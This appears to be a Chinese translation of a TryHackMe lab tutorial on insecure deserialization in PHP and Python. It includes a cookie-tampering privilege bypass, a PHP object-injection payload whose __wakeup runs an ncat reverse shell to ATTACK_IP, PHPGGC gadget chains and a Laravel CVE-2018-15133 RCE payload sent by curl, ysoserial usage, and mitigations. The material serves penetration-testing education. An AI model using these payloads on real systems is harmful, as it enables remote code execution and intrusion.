虽然不同的编程语言可能使用不同的关键字和函数进行序列化，但基本原则是一致的。众所周知，序列化是将对象的状态转换为可以轻松存储或传输的格式，然后在以后重建的过程。无论是 Java、Python、.NET 还是 PHP，每种语言都实施序列化以适应其环境固有的特定功能或安全措施。![different serialisation methods in different languages](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6eb6b58db4657f681b84ae0def396be4.png)

与其他利用用户输入的即时处理的常见漏洞不同，不安全的反序列化问题涉及与应用程序核心逻辑的更深层次交互，通常会操纵其组件的基本行为。  

现在，让我们探索一下如何在不同语言中显式处理序列化，探索其功能、语法和独特特性。

PHP序列化

在 PHP 中，序列化是使用函数完成的。此函数将 PHP 对象或数组转换为表示对象数据和结构的字节流。生成的字节流可以包括各种数据类型，例如字符串、数组和对象，使其唯一。为了说明这一点，让我们考虑一个 notes 应用程序，用户可以在其中保存和检索他们的 notes。我们将创建一个名为 **Notes** 的 PHP 类来表示每个注释并处理序列化和反序列化。\`serialize()\`

\`\`\`php
class Notes {
    public $Notescontent;

    public function __construct($content) {
        $this->Notescontent = $content;
    }
}
\`\`\`

在我们的 Notes 应用程序中，当用户保存笔记时，我们使用 PHP 的函数序列化 Notes 类对象。这会将对象转换为可以存储在文件或数据库中的字符串表示形式。让我们看一下以下序列化 Notes 类对象的代码片段：\`serialize()\`

\`\`\`php
$note = new Notes("Welcome to THM");
$serialized_note = serialize($note);
\`\`\`

访问链接并输入任何字符串以序列化或反序列化。例如，如果您输入字符串 **Welcome to THM**，它将生成如下所示的输出：\`http://10.10.133.158/phptest/\`\`O:5:"Notes":1:{s:7:"content";s:14:"Welcome to THM";}\`

![notes app in PHP](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d20f7d66a362af30e482a3b81561ed3.png)

让我们解码输出：

- \`O:5:"Notes":1:\`：这部分表示序列化数据表示 **Notes** 类的对象，该类具有一个属性。
- \`s:7:"content"\`：表示长度为 7 个字符的属性名称 “**content**”。在序列化数据中，字符串用 后跟字符串的长度和双引号中的字符串表示。整数表示，后跟不带引号的数值。\`s\`\`i\`
- \`s:14:"Welcome to THM"\`：这是 **content** 属性的值，长度为 14 个字符。

神奇的方法

PHP 提供了几种[神奇的方法](https://www.php.net/manual/en/language.oop5.magic.php)，它们在序列化过程中起着至关重要的作用。下面提到了一些重要的方法：![unserialise pre-req in PHP](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3eadbf114d33bd2c1feea8e41ff72d91.png)

- \`__sleep()\`：此方法在序列化之前对对象调用。它可以清理资源，例如数据库连接，并期望返回应序列化的属性名称数组。
- \`__wakeup()\`：该方法在反序列化时调用。它可以重新建立对象可能需要正常运行的任何连接。
- \`__serialize()\`：从 PHP 7.4 开始，此方法允许你通过返回一个表示对象的序列化形式的数组来自定义序列化数据。
- \`__unserialize()\`：此对应项允许从对象的序列化数据中自定义对象的恢复。\`__serialize()\`

python

Python 使用一个名为 **Pickle** 的模块来序列化和反序列化对象。该模块将 Python 对象转换为字节流（反之亦然），使其能够保存到文件中或通过网络传输。Pickling 是 Python 开发人员的强大工具，因为它可以处理几乎所有类型的 Python 对象，而无需手动处理对象的状态。我们将在 Python 中遵循与 PHP 中相同的 notes 应用程序。以下是该类的代码片段：\`app.py\`

\`\`\`python
import pickle
import base64

...
serialized_data = request.form['serialized_data']
notes_obj = pickle.loads(base64.b64decode(serialized_data))
message = "Notes successfully unpickled."
...

elif request.method == 'POST':
    if 'pickle' in request.form:
        content = request.form['note_content']
        notes_obj.add_note(content)
        pickled_content = pickle.dumps(notes_obj)
        serialized_data = base64.b64encode(pickled_content).decode('utf-8')
        binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
        message = "Notes pickled successfully."
\`\`\`

**酸洗工艺**

- **创建 Notes 类**：此类管理注释列表。它提供了添加注释和检索所有注释的方法，从而可以轻松管理应用程序的状态。
- **序列化 （Pickling）：**当用户提交注释时，Notes 类实例（包括所有注释）将使用 .此函数将 Python 对象转换为二进制格式，以便 Python 稍后可以将其转换回对象。\`pickle.dumps()\`

**显示序列化数据 （base64 编码）**

- **为什么使用 base64**：序列化数据是二进制的，不能在所有环境中安全地显示。二进制数据可能包含可能干扰通信协议（如 HTTP）的字节。Base64 是一种将二进制数据转换为纯文本的编码方案。它仅使用可读字符，因此可以安全地通过不支持二进制数据的通道进行传输。![pickle.load pre-req in Python](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/30c29d8133d4a8bcbd803c521b9e32be.png)
- **编码过程**：序列化对象后，使用 .此字符串可以安全地显示在 HTML 中，并且易于存储或传输。\`Notes\`\`base64.b64encode()\`

**反序列化 （Unpickling）**

- **Base64 解码**：解封时，首先使用 .\`base64.b64decode()\`
- **解封**：然后将二进制数据传递给 ，后者从二进制流中重建原始 Python 对象。\`pickle.loads()\`

同样，访问链接并输入字符串 **Welcome to THM**：\`http://10.10.133.158:5000\`

![notes app in Python](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31e397f12ca8453606e381c3b19621a8.png)  

- **Pickling**：当这个字符串被 pickle 时，它会被转换为人类不可读的二进制格式。此二进制格式包含有关数据类型、数据本身以及重建对象所需的其他必要元数据的信息。
- **Base64 编码**：然后将腌制数据的二进制形式编码为 Base64 字符串，该字符串可能类似于 .\`gASVIQAAAAAAAACMBFdlbGNvbWXCoGFkZYFdcQAu\`

在探索序列化格式时，我们讨论了如何在 PHP 和 Python 中实现这一关键功能。PHP 利用 and 函数来管理对象和其他数据类型到可以轻松重建的可存储格式的转换。同样，Python 使用该模块将对象序列化为字节流，并将它们反序列化回其原始状态。\`serialize()\`\`unserialize()\`\`Pickle\`  

除了这两种语言之外，序列化是各种编程环境的通用功能，每个环境都有独特的实现和库。在 Java 中，通过接口促进了对象序列化，允许将对象转换为字节流，反之亦然，这对于网络通信和数据持久性至关重要。对于 .NET，序列化多年来已经发生了重大变化。最初，通常用于二进制序列化;但是，出于安全考虑，现在不鼓励使用它。现代 .NET 应用程序通常用于 JSON 序列化，或用于 XML 任务的 **System.Xml.Serialization**，这反映了向更安全、更标准化的数据交换格式的转变。Ruby 的 模块以序列化和反序列化对象而闻名，对于更人类可读的格式，它通常使用 YAML。每种语言的序列化方法都反映了其使用上下文和安全注意事项，强调了理解和正确实施序列化以确保 Web 应用程序中数据的完整性和安全性的重要性。\`Serializable\`\`BinaryFormatter\`\`System.Text.Json\`\`Marshal\`


## 鉴定
在彻底了解不同编程语言的序列化之后，我们现在将过渡到网络安全的一个关键方面，利用和缓解与序列化相关的漏洞。在讨论漏洞利用技术的细节之前，了解如何识别应用程序中的这些漏洞至关重要，无论您是否可以访问代码（白盒测试）还是无法访问（黑盒测试）。  

访问源代码![magnifying glass over digits](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f7fc8a78e53eaa644b6c8a9fb6d4369c.png)

当可以访问源代码时，识别序列化漏洞可能更直接，但需要敏锐地了解要查找的内容。例如，通过代码审查，我们可以对源代码进行 e xamine 以使用序列化函数，例如 、 、 ） 等。我们必须特别注意用户提供的 input 可能直接传递给这些函数的任何点。\`serialize()\`\`unserialize()\`\`pickle.loads(\`

无法访问源代码

在审计应用程序而不访问其源代码时，挑战在于仅根据外部观察和交互推断它如何处理数据。这通常称为**黑盒测试**。在这里，我们专注于检测服务器响应和 Cookie 中的模式，这些模式可能表明使用了序列化和潜在漏洞。作为渗透测试人员，在 PHP 文件名末尾使用波浪号 是攻击者用来尝试访问文本编辑器或版本控制系统创建的备份或临时文件的常见技术。编辑或保存文件时，某些文本编辑器或版本控制系统可能会制作原始文件的备份副本，并在文件名后附加波浪号。\`~\`

**分析 Server 响应**

- **错误消息**： 某些错误消息可以间接指示序列化问题。例如，PHP 可能会抛出错误或警告，其中包含诸如 Object **deserialisation error** 之类的短语，这些是底层序列化过程和潜在漏洞点的泄露。\`**unserialize()**\`
- **应用程序行为的不一致**：响应纵的输入（例如，修改的 cookie 或 POST 数据）的意外行为可能表明数据反序列化和处理方式存在问题。观察应用程序如何处理更改的序列化数据可以提供有关可能易受攻击的代码的线索。

**检查 Cookie**

Cookie 通常用于在 Web 应用程序中存储序列化数据。通过检查 cookie 的内容，通常可以推断：

- **Cookie 中的 Base64 编码值（PHP 和 .NET）：**如果 Cookie 包含看起来经过 base64 编码的数据，则解码可能会显示序列化对象或数据结构。PHP 经常使用序列化进行会话管理，并以序列化格式存储会话变量。
- **ASP.NET 视图状态**：.NET 应用程序可能会在发送到客户端浏览器的视图状态中使用序列化。有时可以看到一个名为 的字段，该字段是 base64 编码的。解码和检查它可以揭示它是否包含可能被利用的序列化数据。\`__VIEWSTATE\`

在此任务中，我们学习了如何识别漏洞。在接下来的任务中，我们将研究利用此漏洞的各种技术。


## 利用 - 更新属性

在本任务中，我们将探索 PHP 中的一个实际示例，使用一个简单的笔记共享应用程序作为我们的案例研究。我们的笔记共享应用程序允许用户轻松创建、保存和共享笔记。用户可以将他们的笔记输入到应用程序中，然后保存以备将来参考。此外，用户可以与他人共享他们的笔记，从而促进协作和信息交换。该应用程序还包括基于订阅的功能，确保只有订阅的用户才能访问某些功能，例如笔记共享。您可以通过访问访问该网站 链接 .\`http://10.10.133.158/case1\`

![notes-sharing app in PHP](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d3b4a29dd4ca6d3357f3b5372e368468.png)

让我们看看应用程序是如何构建的。

**定义 Notes 类**

该应用程序有一个类，表示应用程序中的注释。此类具有三个私有属性：、 和 。我们还有 setter 和 getter 方法来操作属性。\`Notes\`\`user\`\`role\`\`isSubscribed\`\`isSubscribed\`  

\`\`\`php
class Notes {

    private $user;
    private $role;
    private $isSubscribed;

    public function __construct($user, $role, $isSubscribed) {
        $this->user = $user;
        $this->role = $role;
        $this->isSubscribed = $isSubscribed;
    }

    public function setIsSubscribed($isSubscribed) {
        $this->isSubscribed = $isSubscribed;
    }

    public function getIsSubscribed() {
        return $this->isSubscribed;
 }
}
\`\`\`

**在 Cookie 中存储用户数据**

当用户第一次访问我们的应用程序时，它会设置一个包含其用户数据的序列化 cookie。这包括其用户名、角色和订阅状态 （）。如果用户是付费会员 （**isSubscribed = true**），则允许他们共享笔记。\`isSubscribed\`

![Inspect element tab for viewing cookies](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e5ce341b090b04e5749ad1834199bba2.png)  

**利用漏洞**

在此步骤中，我们将说明攻击者如何通过修改序列化 cookie 值来利用漏洞来获得对共享笔记的未经授权的访问权限。

- **序列化 cookie**：解码 base64 编码的 cookie 值后，我们获得 Notes 对象的以下序列化表示：

\`\`\`php
O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}
\`\`\`

正如我们已经知道的，在 PHP 序列化中，类名在属性名前面加上前缀，以防它不是公开的，以确保唯一性并帮助反序列化。这是 PHP 在内部处理对象序列化和反序列化的一部分。当一个对象被序列化时，PHP 会存储对象的属性和类名。这确保了当对象稍后被反序列化时，PHP 知道要实例化哪个类以及如何将序列化数据正确地分配给对象的属性。让我们将序列化的 note 分解为它的各个组成部分：

- **O：5：“Notes”：3**： 这表示类名为 Notes 的对象 （O），该对象具有三个属性。
- **s：4：“用户”;s：5：“guest”**：这表示长度为 4 个字符的字符串，表示值为 “**guest**” 的属性。\`user\`
- **s：4：“角色”;s：5：“guest”**：与上一个类似，它表示值为 “**guest**” 的属性。\`role\`
- **s：12：“isSubscribed”;b：0**：这表示一个布尔值 （b） 属性，其值为 false （0）。\`isSubscribed\`

利用漏洞

在当前场景中，当用户想要尝试共享笔记时，他们会收到以下弹出窗口：

![Pop-up stating Please subscribe to share the note](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9bfc64dfa33447bc22bb8adb2b37ca9c.png)  

现在，后端发生了什么？后端 PHP 代码验证传入的 cookie，对其进行反序列化，然后验证用户是否已订阅。我们的主要任务是绕过这一点。

假设攻击者拦截了这个序列化的 cookie 值，并将属性从 false （0） 修改为 true （1）。攻击者可以通过更改序列化数据中的布尔值，在未经合法授权的情况下操纵订阅状态。\`isSubscribed\`

![pop-up with flag value](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3bc45283cd430f96411a2b62afa41cf6.png)

修改后，攻击者将再次对序列化数据进行 base64 编码，并将原始 cookie 值替换为修改后的 cookie 值。这将授予他们在未经授权的情况下在其他平台上共享笔记的权限，从而绕过预期的订阅限制。

## 利用 - 对象注入


对象注入是由于 Web 应用程序中不安全的数据反序列化而引起的漏洞。当不受信任的数据被反序列化为对象时，攻击者可以操纵序列化数据来执行任意代码，从而导致严重的安全风险。在本任务中，我们将探索对象注入的工作原理，并通过一个简单的 PHP 代码片段演示其影响。

众所周知，该漏洞来自序列化和反序列化过程，该过程允许将 PHP 对象转换为可存储格式（序列化）并重建回对象（反序列化）。虽然序列化和反序列化对于数据存储和传输很有用，但如果实施不当，它们也会带来安全风险。

要利用 PHP 对象注入漏洞，应用程序应包含一个具有 PHP 魔术方法（如 或 ）的类，该方法可被用于恶意目的。在调用该方法之前，应声明所有涉及攻击的类（除非支持对象自动加载）。\`__wakeup\`\`__sleep\`\`unserialize()\`  

**例**

让我们考虑一个代码片段，它显示了使用 and 函数的序列化和反序列化。该代码接受 **GET** 参数 **decode** 或 **encode**，并相应地转换用户提供的值。\`index.php\`\`serialize()\`\`unserialize()\`

\`\`\`php
<?php
class UserData {
    private $data;
    public function __construct($data) {
        $this->data = $data;
    }
..
require 'test.php';
if(isset($_GET['encode'])) {
    $userData = new UserData($_GET['encode']);
    $serializedData = serialize($userData);
    $base64EncodedData = base64_encode($serializedData);
    echo "Normal Data: " . $_GET['encode'] . "<br>";
    echo "Serialized Data: " . $serializedData . "<br>";
    echo "Base64 Encoded Data: " . $base64EncodedData;

} elseif(isset($_GET['decode'])) {
    $base64EncodedData = $_GET['decode'];
    $serializedData = base64_decode($base64EncodedData);
    $test = unserialize($serializedData);
    echo "Base64 Encoded Serialized Data: " . $base64EncodedData . "<br>";
    echo "Serialized Data: " . $serializedData;

...
\`\`\`

例如，如果我们通过 URL [http://10.10.133.158/case2/?encode=hellothm](http://10.10.133.158/case2/?encode=hellothm) 发送输入 **hellothm**，我们将得到以下输出：

![serialised state in PHP](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/711bd1f1f1922a3ae8dc0fe0e32fac81.png)

我们看到代码包含一个名为 .从源代码审查或考虑框架是否开源，渗透测试者知道它包含一个名为 class 的类，如下所示：\`test.php\`\`test.php\`\`MaliciousUserData\`

\`\`\`php
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server
    
    public function __wakeup() { 
    exec($this->command);
...

?>
\`\`\`

  

在上面的代码中，通过不安全的反序列化，可以操作对象的属性，包括更改上述代码中类的属性。这可以通过制作包含所需属性值的特制序列化字符串来实现。例如，如果我们想修改 属性以执行不同的命令或连接到不同的服务器，我们可以序列化具有所需属性值的对象，然后将其注入到易受攻击的 函数中。这样，在反序列化时，作的属性值将被加载到对象中。\`command\`\`MaliciousUserData\`\`command\`\`unserialize()\`

重要的是要了解在不安全的反序列化期间，你不能直接更新方法本身的定义。该方法是类定义的一部分，在反序列化过程中保持静态。但是，您可以做的是在方法中修改对象的行为或属性。这意味着，虽然该方法的定义保持不变，但可以操纵它在反序列化时的操作以实现不同的结果。\`__wakeup\`\`__wakeup\`\`__wakeup\`  

现在我们已经了解了基础知识，是时候准备有效负载了。

准备 Payload

如前所述，调用另一个类是 PHP 中的正常功能，如果目标网站使用的是开源代码，则可以查看该文件的代码。 中的代码盲目地反序列化输入，而不执行任何清理。这里有什么选项？如果我们修改类并修改其属性，以便在调用函数时，将使用攻击者提供的值调用它，该怎么办？\`index.php\`\`MaliciousUserData\`\`command\`\`__wakeup\`

让我们在 AttackBox 上创建一些 PHP 代码，以生成恶意序列化用户数据。

\`\`\`php
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
}

$maliciousUserData = new MaliciousUserData();
$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);
echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
?>
\`\`\`

- 在上面的代码中，类 （） 的函数将使用 Ncat 执行反向 shell 命令，以连接到指定的 IP 地址 （） 和带有 -e 标志的端口 （） 作为 shell 执行\`_wakeup()\`\`MaliciousUserData\`\`test.php\`\`ATTACK_IP\`\`4444\`\`/bin/sh\`
- 创建文件后，通过终端执行它。这将返回该类的 base64 编码的序列化对象。\`php index.php\`\`MaliciousUserData\`
- 生成的 base64 编码字符串将如下所示：.\`TzoxNzoiTWFsaWNp[Redacted]\`
- 使用 AttackBox 上的命令在端口 4444 上启动 Netcat 侦听器。\`nc -nvlp 4444\`
- 现在，是时候利用不安全的反序列化了，通过访问 URL 来解码 shellcode，而不生成 shellcode。\`http://10.10.133.158/case2/?decode=[SHELLCODE]\`  
    
- 访问 URL 后，index.php 文件的 deserialise 函数将反序列化字符串并执行该函数，从而导致远程 shell。\`__wakeup()\`

终端

\`\`\`shell-session
thm@ubuntu$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from ATTACK_IP 35838 received! 
\`\`\`

在接下来的任务中，我们将了解允许攻击者利用漏洞的问题，以及我们如何从安全编码人员的角度保护它。
##  自动化脚本

在渗透测试期间自动执行脚本对于有效识别和利用 Web 应用程序中的漏洞至关重要。在本任务中，我们将探索一种名为 **PHP Gadge Chain （PHPGGC）** 的工具，该工具在此过程中起着至关重要的作用，可以自动发现不安全的反序列化漏洞。PHPGGC 类似于 Java 生态系统中的 Ysoserial，可帮助安全专业人员评估 PHP 应用程序的安全状况并降低潜在风险。

菲律宾小工具链 （PHPGGC）  

PHPGGC 主要是一种用于生成 PHP 对象注入攻击中使用的小工具链的工具，专门用于利用与 PHP 对象序列化和反序列化相关的漏洞。

**功能性**

- **小工具链**：PHPGGC 为各种 PHP 框架和库提供了小工具链库。这些小工具链是一系列对象和方法，旨在当 PHP 应用程序不安全地反序列化用户提供的数据时利用特定漏洞。  
    
- **Payload Generation**：PHPGGC 的主要目的是促进生成可以触发这些漏洞的序列化 payloads。它可以帮助安全研究人员和渗透测试人员创建有效载荷，以证明不安全的反序列化缺陷的影响。
- **Payload Customisation**：用户可以通过为小工具链中涉及的函数或方法指定参数来自定义 payload，从而定制攻击以实现特定结果，例如编码。  
    

您可以从 PHPGGC 的 [GitHub 存储库](https://github.com/ambionics/phpggc)下载 PHPGGC，也可以通过该目录使用 AttackBox 上已有的版本。安装的版本已经包含一些小工具链、PHP 对象序列和旨在利用反序列化漏洞的方法调用。这些小工具链利用 PHP 的神奇方法来实现各种攻击目标，例如远程代码执行。  
要列出所有可用的小工具链，您可以使用 PHPGGC 的选项，它将显示用于发起特定攻击的 名称、版本、类型和向量。此外，您还可以根据小工具链的功能过滤小工具链，例如针对特定 PHP 框架或实现特定利用技术的链，使用选项后跟过滤器关键字（Drupal、Laravel 等）。这允许您为您的利用场景选择合适的小工具链，如下所示：\`/opt/phpggc\`\`-l\`\`-l\`

终端

\`\`\`shell-session
thm@machine$ php phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                                 TYPE                      VECTOR          I    
Bitrix/RCE1                               17.x.x <= 22.0.300                                      RCE: Command              __destruct           
CakePHP/RCE1                              ? <= 3.9.6                                              RCE: Command              __destruct           
CakePHP/RCE2                              ? <= 4.2.3                                              RCE: Command              __destruct           
CodeIgniter4/FD1                          <= 4.3.6                                                File delete               __destruct           
CodeIgniter4/FD2                          <= 4.3.7                                                File delete               __destruct           
CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                          File read                 __toString      *    
CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                     RCE: Command              __destruct           
CodeIgniter4/RCE3                         4.0.4 <= 4.4.3                                          RCE: Command              __destruct           
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE: Command              __destruct         
\`\`\`

例如，输出 for 表示名为 的小工具链 利用了 CakePHP 版本中的 RCE 漏洞。该漏洞允许攻击者利用 magic 方法在服务器上执行任意命令 。\`CakePHP/RCE1\`\`CakePHP/RCE1\`\`3.9.6\`\`__destruct\`

利用 Web 应用程序  

作为渗透测试人员，我们专注于 Laravel 网站，以利用 [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133) 下发现的已知漏洞。当 Laravel 从 . 如果不安全处理，此反序列化过程可能会导致在服务器上执行任意代码。有关漏洞的详细信息可以从 [Laravel 安全版本中](https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30)读取，但我们的主要重点是如何在利用过程中利用 PHP 小工具链。上述漏洞可以通过三个主要因素来利用：\`X-XSRF-TOKEN\`

- **第 1 步**：需要来自 Laravel，框架使用它来加密 XSRF 令牌。\`APP_KEY\`
- **第 2 步**：使用 PHPGGC 生成执行命令的未序列化有效负载。这被认为是一项复杂的任务，该工具可以提供帮助。
- **第 3 步**：最后，我们必须使用 APP_KEY 加密有效负载并发送 POST 请求。这通常因框架而异。  
    

在这个任务中，我们的重点将主要放在第 2 步，并了解 PHPGGC 将如何帮助我们作为渗透测试人员。访问 [http://10.10.133.158:8089](http://10.10.133.158:8089/) 易受攻击的 Laravel 应用程序。作为渗透测试人员，我们可以通过多种技术来识别 Web 应用程序版本。您可以访问 [信息收集和漏洞扫描](https://tryhackme.com/module/information-gathering-and-vulnerability-scanning) 模块以详细了解这一点。Laravel 应用程序版本为 5.6.29。

![laravel application dashboard](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/821938ace57fe41fea2c7476da9e3e4e.png)

现在我们将详细地逐步开发：

- 第一步，我们将通过任何攻击媒介（例如社会工程）获取APP_KEY。您可以通过访问 [http://10.10.133.158:8089/get-key](http://10.10.133.158:8089/get-key) 来获得。为方便起见，此页面还将为您提供第一个具有 **whoami** 命令的有效负载。\`APP_KEY\`  
    
- 对于第二步，我们需要确定我们可以使用的有效负载。  
    

终端

\`\`\`shell-session
thm@machine$ php phpggc -l Laravel

Gadget Chains
-------------

NAME                  VERSION           TYPE             VECTOR    
Laravel/RCE1          5.4.27            rce              __destruct
Laravel/RCE2          5.5.39            rce              __destruct
Laravel/RCE3          5.5.39            rce              __destruct
Laravel/RCE4          5.5.39            rce              __destruct

\`\`\`

展望未来，我们可以使用各种小工具生成有效负载。每个 gadget 都有其相关性，并在反序列化过程中使用不同的类。在此示例中，我们将使用 RCE3，并可以通过键入 base-64 编码的有效负载的命令来生成有效负载。未编码的有效负载如下所示：\`php phpggc -b Laravel/RCE3 system whoami\`  

终端

\`\`\`shell-session
thm@machine$ php phpggc Laravel/RCE3 system whoami O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}

\`\`\`

Payload 的细分  

- \`Illuminate\\Broadcasting\\PendingBroadcast\`：此类处理 Laravel 中的事件广播。在这里，它主要是携带嵌套恶意对象的工具。
- \`Illuminate\\Notifications\\ChannelManager\`：此对象管理通知通道。我们通过其属性 操作它以注入任意代码执行，该属性通常会引用应用程序服务容器。我们滥用它来保持我们的命令。我们还操作了 twist 的 and 属性，以创建一个调用 PHP 函数的场景，并执行传递给它的任何代码。\`*app\`\`whoami\`\`*defaultChannel\`\`*customCreators\`\`assert\`

正如我们已经知道的，Laravel 最初使用**加密**和**序列化的** cookie 来安全地存储会话和 CSRF 令牌数据，两者使用相同的方法。如果您访问易受攻击的应用程序，您可以看到加密和序列化的 cookie，如下所示：

![laravel encrypted cookie](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9dfa21a7a10296faecf94afd2404bf5a.png)  

基本思想是避免篡改不良行为者的数据，但尽管如此，他们没有意识到，即使是如此强大的安全机制也可能通过不安全的序列化而被破坏。  

现在我们有了 and 有效负载，是时候创建一个加密的 CSRF 令牌了。为了这个房间，我们准备了一个 PHP 脚本，该脚本将 APP_KEY 和 payload 作为参数并返回加密的令牌。您可以在 http://10.10.133.158:8089/cve.php?app_key=xx&payload=xxx 访问该链接[](http://10.10.133.158:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0%3D)。 为方便起见，此 URL 已具有 URL 编码的密钥和带有 **whoami** 命令的第一个有效负载。了解 Laravel 和 WordPress 等框架的加密机制是一项简单的任务，但目前，它超出了房间的范围。\`APP_KEY\`

在对 Yii、CakePHP 和 Laravel 等 Web 框架进行渗透测试时，必须了解每个框架都有独特的路由和加密机制，尽管它们都是基于 PHP 构建的。这些框架采用不同的架构和安全实现设计，这意味着像 Laravel 中的 RCE3 这样的漏洞，特别是利用 Laravel 的服务容器和序列化行为，不一定适用于 WordPress 或其他基于 PHP 的系统。例如，WordPress 具有不同的结构，并且不使用 Laravel 的特定类或方法，因此为 Laravel 架构量身定制的漏洞不会直接在 WordPress 上运行。  

现在我们已经有了加密的令牌，我们可以使用 CSRF 令牌发出一个简单的 POST 请求，如下所示来执行命令。有效负载结果将显示在响应的开头。\`cURL\`

终端

\`\`\`shell-session
thm@machine$curl 10.10.133.158:8089 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ=='| head -n 2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7245    0  7245    0     0  73181      0 --:--xxxx--:--:-- --:--:--     0
<!DOCTYPE html><!--
100 14485    0 14485    0     0   141k      0 --:--:-- --:--:-- --:--:--  140k
curl: (23) Failed writing body (947 != 7240)

\`\`\`

适用于 Java 的 Ysoserial

Ysoserial 是一种广为人知的漏洞利用工具，专门用于测试 Java 应用程序的安全性以应对序列化漏洞。它有助于生成利用这些漏洞的有效负载，使其成为旨在评估和利用使用 Java 序列化的应用程序的攻击者和渗透测试人员的重要工具。

要使用 Ysoserial，攻击者通常会使用命令生成有效负载，例如 ，其中 是漏洞利用的类型，是他们希望在目标系统上运行的任意命令。例如，使用有效负载类型可能如下所示：。此命令会生成一个序列化对象，当被易受攻击的应用程序反序列化时，该对象将执行指定的命令。Ysoserial 可在 GitHub [上下载](https://github.com/frohoff/ysoserial)。\`java -jar ysoserial.jar [payload type] '[command to execute]'\`\`[payload type]\`\`[command to execute]\`\`CommonsCollections1\`\`java -jar ysoserial.jar CommonsCollections1 'calc.exe'\`


降低与不安全反序列化相关的风险对于确保 Web 应用程序的安全性至关重要。通过实施有效的防御措施，组织可以显著降低漏洞利用的可能性并减轻

潜在损害。我们将从红队/渗透测试员和安全代码的角度来讨论这个问题。

  
## 缓解措施
Red Teamer / 渗透测试器视角

- **代码库分析**：对应用程序的序列化机制进行全面审查。确定整个代码库中潜在的反序列化和序列化点。
- **漏洞识别**：使用静态分析工具检测不安全的反序列化漏洞。查找不正确的输入验证、不安全的库和过时的依赖项。
- **模糊测试和动态分析**：采用模糊测试技术生成无效或意外的输入数据。使用动态分析工具监控应用程序在运行时的行为。
- **错误处理评估**：评估应用程序在反序列化期间如何处理错误。查找揭示系统详细信息的潜在错误消息或堆栈跟踪。

Secure Coder 视角

- **避免不安全的序列化格式**：避免使用本质上不安全的序列化格式，例如 Java 序列化。选择更安全的替代方案，例如具有强大验证机制的 JSON 或 XML。
